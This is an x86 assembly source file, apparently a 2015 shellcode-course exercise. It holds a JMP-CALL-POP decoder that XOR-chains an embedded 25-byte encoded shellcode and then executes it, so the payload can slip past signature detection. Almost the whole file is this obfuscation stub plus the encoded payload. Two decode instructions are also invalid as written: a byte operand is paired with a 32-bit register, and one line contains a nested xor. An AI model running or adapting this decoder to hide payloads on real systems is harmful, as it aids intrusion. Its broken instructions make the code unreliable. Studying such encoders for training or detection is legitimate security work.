; Filename    : decoder.asm
; Author      : Joris Hartog
; Date        : 17-12-2015
; Student     : SLAE-704
; Size        : 25 (code) + 44 (decoder) = 69
; Description : This program decodes the shellcode by XOR'ing each decoded byte
;  with the previous encoded byte. The first decoded byte gets XOR'd with a key. 

global _start

section .text

_start:

	jmp short shellcodeCall

continueCode:
	
	pop esi			; esi contains pointer to shellcode
	push byte 0xAA
	pop eax			; eax contains the key
	push byte 24
	pop ecx			; ecx contains the shellcode length minus one

	xor byte [esi], eax
	inc esi

decode:

	xor byte [esi], xor byte [esi-1]
	inc esi

	loop decode

	jmp short shellcode

shellcodeCall:

	call continueCode
	shellcode: db 0xce,0x3f,0x50,0x76,0x1d,0x97,0xd0,0x2f,0x8c,0x97,0x68,0xd0,0x9d,0x96,0x91,0x89,0x1c,0xaf,0x53,0x76,0x1e,0x4f,0xf4,0xcd,0x7f
